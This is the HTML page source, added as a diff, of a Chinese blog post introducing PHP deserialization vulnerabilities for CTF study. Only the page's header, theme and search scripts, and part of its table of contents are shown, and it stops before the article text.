@@ -1,0 +1,1028 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.17.3"><title>浅谈PHP反序列化漏洞</title><meta name="title" content="浅谈PHP反序列化漏洞"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/unserialize/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/unserialize/"><meta property="og:title" content="浅谈PHP反序列化漏洞"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/unserialize/"><meta property="twitter:title" content="浅谈PHP反序列化漏洞"><meta property="twitter:description" content><!-- 暗色模式初始化脚本 --><script>
+	// 防止暗色模式闪烁
+	(function() {
+		const theme = localStorage.getItem('theme');
+		const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+		
+		if (theme === 'dark' || (!theme && systemPrefersDark)) {
+			document.documentElement.classList.add('dark');
+		} else {
+			document.documentElement.classList.remove('dark');
+		}
+	})();
+</script><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.DNYbVg5E.css">
+<link rel="stylesheet" href="/_astro/waline.BpVnDCEn.css">
+<link rel="stylesheet" href="/_astro/_slug_.N2UNtMs9.css">
+<style>.toc[data-astro-cid-woz2nwfv]{position:fixed;top:12rem;right:6rem;width:260px;max-height:calc(100vh - 16rem);overflow-y:auto;padding:1.5rem;font-size:.9375rem;line-height:1.5;z-index:100}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar{width:4px}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#0003;border-radius:2px}.dark[data-astro-cid-woz2nwfv] .toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#ffffff4d}@media(max-width:1280px){.toc[data-astro-cid-woz2nwfv]{position:static;width:100%;max-height:none;margin:2rem 0}}.toc-title[data-astro-cid-woz2nwfv]{font-size:1rem;font-weight:600;margin:0 0 1rem}.toc-list[data-astro-cid-woz2nwfv],.toc-sublist[data-astro-cid-woz2nwfv]{list-style:none;padding:0;margin:0}.toc-sublist[data-astro-cid-woz2nwfv]{padding-left:1.25rem;margin:.25rem 0}.toc-link[data-astro-cid-woz2nwfv]{display:block;text-decoration:none;padding:.375rem .5rem;margin:.125rem 0;border-radius:.5rem;font-weight:400}.toc-link[data-astro-cid-woz2nwfv].active{font-weight:500;background:#3b82f61a!important;color:#3b82f6!important}.dark[data-astro-cid-woz2nwfv] .toc-link[data-astro-cid-woz2nwfv].active{background:#60a5fa33!important;color:#60a5fa!important}.lightbox[data-astro-cid-vqtgpguw]{position:fixed;inset:0;z-index:500;display:flex;align-items:center;justify-content:center;animation:fade-in .3s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:#3037424d;overflow:hidden;padding:20px;box-sizing:border-box}.lightbox[data-astro-cid-vqtgpguw].exit{animation:fade-out .3s}@keyframes fade-in{0%{opacity:0}}@keyframes fade-out{to{opacity:0}}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:80vw!important;max-height:75vh!important;width:auto!important;height:auto!important;-o-object-fit:contain!important;object-fit:contain!important;border-radius:3px;cursor:zoom-out;display:block!important;margin:0 auto;opacity:0;transition:opacity .3s ease}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw].show{opacity:1}.lightbox[data-astro-cid-vqtgpguw] .toolbar[data-astro-cid-vqtgpguw]{position:absolute;bottom:5%;left:1rem;right:1rem;display:flex;justify-content:space-between;align-items:center;color:#fff;max-width:600px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);margin:0 auto;padding:10px;border-radius:5px;background:#0000001a;z-index:1}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]{width:32px;height:32px;display:flex;justify-content:center;align-items:center;cursor:pointer;border-radius:3px;background:#fff3;transition:all .2s}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]:hover{background:#ffffff80}.lightbox[data-astro-cid-vqtgpguw] .counter[data-astro-cid-vqtgpguw]{width:60px;display:flex;align-items:center;justify-content:center;font-size:14px}.lightbox[data-astro-cid-vqtgpguw] .nav[data-astro-cid-vqtgpguw]{display:flex;gap:10px}@media(max-width:768px){.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:75vw!important;max-height:65vh!important}}
+</style></head> <body class="bg-white dark:bg-gray-900 transition-colors duration-300"> <header class="relative m-0 px-4 py-4" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a><a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a><a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a><a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a><a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 桌面端搜索和主题切换按钮 --> <div class="absolute right-4 top-1/2 transform -translate-y-1/2 hidden md:flex items-center gap-3" data-astro-cid-3ef6ksr2> <button id="search-btn" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" title="搜索 (Ctrl+K)" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> <!-- 移动端控件 --> <div class="md:hidden flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <button id="menu-btn" class="flex flex-col space-y-1 p-2 text-black dark:text-white" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div class="flex items-center gap-2" data-astro-cid-3ef6ksr2> <button id="search-btn-mobile" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> </div> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-100 dark:border-gray-700 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Home </a><a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Blog </a><a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Links </a><a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Comment </a><a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),n=document.getElementById("menu");function i(){n?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单")}function d(){n?.classList.remove("hidden"),e?.classList.add("open"),e?.setAttribute("aria-expanded","true"),e?.setAttribute("aria-label","关闭菜单")}e&&n&&(e.addEventListener("click",()=>{e.classList.contains("open")?i():d()}),e.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())}),document.addEventListener("keydown",t=>{t.key==="Escape"&&e.classList.contains("open")&&(i(),e.focus())}),document.addEventListener("click",t=>{const s=t.target;!e.contains(s)&&!n.contains(s)&&i()}));const c=document.getElementById("search-btn"),a=document.getElementById("search-btn-mobile");function o(){typeof window.openSearchModal=="function"&&window.openSearchModal()}c&&c.addEventListener("click",o);a&&a.addEventListener("click",o);</script>  <!-- 搜索模态框 --><div id="search-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50 dark:bg-black/70 backdrop-blur-sm" role="dialog" aria-modal="true" aria-labelledby="search-modal-title" data-astro-cid-qk3db3zz> <div class="relative w-full max-w-2xl mx-4 bg-white dark:bg-gray-800 rounded-2xl shadow-2xl transform transition-all" id="search-modal-content" data-astro-cid-qk3db3zz> <!-- 搜索框 --> <div class="p-4 border-b border-gray-200 dark:border-gray-700" data-astro-cid-qk3db3zz> <div class="relative" data-astro-cid-qk3db3zz> <input type="text" id="search-modal-input" placeholder="输入关键词搜索文章..." class="w-full px-4 py-3 pl-10 pr-10 text-base bg-gray-100 dark:bg-gray-700 rounded-xl border border-transparent
+            placeholder:text-gray-400 dark:placeholder:text-gray-500
+            focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500/50 focus:bg-white dark:focus:bg-gray-600
+            focus:outline-none
+            transition-all duration-200
+            text-gray-900 dark:text-white" autocomplete="off" data-astro-cid-qk3db3zz> <div class="absolute left-3 top-1/2 -translate-y-1/2" data-astro-cid-qk3db3zz> <svg class="w-5 h-5 text-gray-400 dark:text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <button id="search-modal-close" class="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 dark:text-gray-500 hover:text-gray-600 dark:hover:text-gray-300 transition-colors" aria-label="关闭搜索" data-astro-cid-qk3db3zz> <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" data-astro-cid-qk3db3zz></path> </svg> </button> </div> </div> <!-- 搜索结果容器 --> <div class="max-h-[60vh] overflow-y-auto" data-astro-cid-qk3db3zz> <!-- 搜索结果 --> <div id="search-modal-results" class="p-4 space-y-3" data-astro-cid-qk3db3zz> <!-- 结果将在这里动态插入 --> </div> <!-- 空状态 --> <div id="search-modal-empty" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="mb-4" data-astro-cid-qk3db3zz> <svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <h3 class="text-base font-medium text-gray-900 dark:text-gray-100 mb-2" data-astro-cid-qk3db3zz>
+未找到相关文章
+</h3> <p class="text-sm text-gray-500 dark:text-gray-400" data-astro-cid-qk3db3zz>
+试试其他关键词
+</p> </div> <!-- 加载状态 --> <div id="search-modal-loading" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="inline-block animate-spin h-6 w-6 border-2 border-gray-400 dark:border-gray-500 border-t-transparent rounded-full" data-astro-cid-qk3db3zz></div> </div> </div> <!-- 快捷键提示 --> <div class="px-4 py-2 border-t border-gray-200 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400 flex items-center justify-between" data-astro-cid-qk3db3zz> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>Esc</kbd> 关闭</span> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>↑</kbd><kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs ml-1" data-astro-cid-qk3db3zz>↓</kbd> 导航</span> </div> </div> </div> <script type="module">let L=[],p=null,a=-1,h=[];const s=document.getElementById("search-modal");document.getElementById("search-modal-content");const i=document.getElementById("search-modal-input"),x=document.getElementById("search-modal-close"),c=document.getElementById("search-modal-results"),l=document.getElementById("search-modal-empty"),y=document.getElementById("search-modal-loading");async function b(){if(!(L.length>0))try{L=await(await fetch("/search.json")).json()}catch(e){console.error("加载搜索索引失败:",e)}}function u(e){const t=document.createElement("div");return t.textContent=e,t.innerHTML}function k(e,t){if(!t.trim())return e;const n=new RegExp(`(${t.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")})`,"gi");return e.replace(n,'<mark class="bg-yellow-200 dark:bg-yellow-800/50 px-0.5 rounded">$1</mark>')}function M(e){if(!e.trim())return[];const t=e.toLowerCase(),n=[];for(const r of L){const d=r.title.toLowerCase().includes(t),m=r.content.toLowerCase().includes(t),g=r.categories.some(o=>o.toLowerCase().includes(t)),v=r.tags.some(o=>o.toLowerCase().includes(t));if(d||m||g||v){let o=0;d&&(o+=10),m&&(o+=1),g&&(o+=3),v&&(o+=3),n.push({...r,score:o})}}return n.sort((r,d)=>r.score!==d.score?(d.score||0)-(r.score||0):new Date(d.date).getTime()-new Date(r.date).getTime())}function T(e,t){if(!(!c||!l||!y)){if(y.classList.add("hidden"),a=-1,e.length===0){c.innerHTML="",l.classList.remove("hidden");return}l.classList.add("hidden"),c.innerHTML=e.map((n,r)=>{const d=k(u(n.title),t),m=k(u(n.excerpt),t),g=new Date(n.date).toLocaleDateString("zh-CN",{year:"numeric",month:"short",day:"numeric"});return`
+        <a 
+          href="${u(n.url)}" 
+          class="block p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors search-result-item ${r===a?"bg-gray-100 dark:bg-gray-700":""}"
+          data-index="${r}"
+        >
+          <h3 class="text-base font-semibold text-gray-900 dark:text-white mb-1">${d}</h3>
+          <p class="text-sm text-gray-600 dark:text-gray-400 mb-2 line-clamp-1">${m}</p>
+          <div class="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-gray-400">
+            <time datetime="${n.date}">${g}</time>
+            ${n.categories.length>0?`<span>·</span><span>${u(n.categories[0])}</span>`:""}
+            ${n.tags.length>0?`<span>·</span><span>${u(n.tags[0])}</span>`:""}
+          </div>
+        </a>
+      `}).join(""),w()}}function w(){c?.querySelectorAll(".search-result-item")?.forEach((t,n)=>{n===a?t.classList.add("bg-gray-100","dark:bg-gray-700"):t.classList.remove("bg-gray-100","dark:bg-gray-700")})}function I(){if(!i)return;const e=i.value.trim();if(p&&clearTimeout(p),e.length===0){c&&l&&(c.innerHTML="",l.classList.add("hidden"));return}y&&y.classList.remove("hidden"),p=setTimeout(()=>{h=M(e),T(h,e)},200)}function E(){!s||!i||(s.classList.remove("hidden"),s.classList.add("flex"),setTimeout(()=>{i.focus()},100),b(),document.body.style.overflow="hidden")}function f(){!s||!i||(s.classList.add("hidden"),s.classList.remove("flex"),i.value="",c&&l&&(c.innerHTML="",l.classList.add("hidden")),a=-1,h=[],document.body.style.overflow="")}function $(){!s||!i||!x||(s.addEventListener("click",e=>{e.target===s&&f()}),x.addEventListener("click",f),i.addEventListener("input",I),i.addEventListener("keydown",e=>{if(e.key==="Escape")e.preventDefault(),f();else if(e.key==="ArrowDown")e.preventDefault(),a<h.length-1&&(a++,w());else if(e.key==="ArrowUp")e.preventDefault(),a>0&&(a--,w());else if(e.key==="Enter"&&a>=0){e.preventDefault();const t=c?.querySelector(`[data-index="${a}"]`);t&&(window.location.href=t.href)}}),document.addEventListener("keydown",e=>{(e.metaKey||e.ctrlKey)&&e.key==="k"&&(e.preventDefault(),s?.classList.contains("hidden")?E():f())}),window.openSearchModal=E)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",$):$();</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 dark:text-white mb-6 tracking-tight leading-tight"> 浅谈PHP反序列化漏洞 </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-01-11T18:36:49.000Z" class="text-[#86868b] dark:text-gray-400 tracking-wide"> <time datetime="2023-01-11T18:36:49.000Z"> Jan 11, 2023 </time> </time>  <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] dark:text-gray-400 tracking-wide" aria-label="阅读时间 24 min read">24 min read</span>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc transition-colors duration-300" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title text-gray-900 dark:text-white" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#写在前面" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1. 写在前面 </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#魔术方法" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.1. 魔术方法 </a> </li><li data-astro-cid-woz2nwfv> <a href="#访问控制符" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.2. 访问控制符 </a> </li><li data-astro-cid-woz2nwfv> <a href="#举个例子" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.3. 举个例子 </a> </li><li data-astro-cid-woz2nwfv> <a href="#反序列化特性" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.4. 反序列化特性 </a> </li><li data-astro-cid-woz2nwfv> <a href="#bypass" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.5. bypass </a> </li><li data-astro-cid-woz2nwfv> <a href="#极客大挑战-2019-php" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.6. [极客大挑战 2019] PHP </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#session-反序列化" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2. Session 反序列化 </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#存储引擎" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.1. 存储引擎 </a> </li><li data-astro-cid-woz2nwfv> <a href="#举个例子-1" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.2. 举个例子 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#原生类-反序列化" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3. 原生类 反序列化 </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#errorexception-xss" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.1. Error/Exception XSS </a> </li><li data-astro-cid-woz2nwfv> <a href="#splfileobject-读文件" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.2. SplFileObject 读文件 </a> </li><li data-astro-cid-woz2nwfv> <a 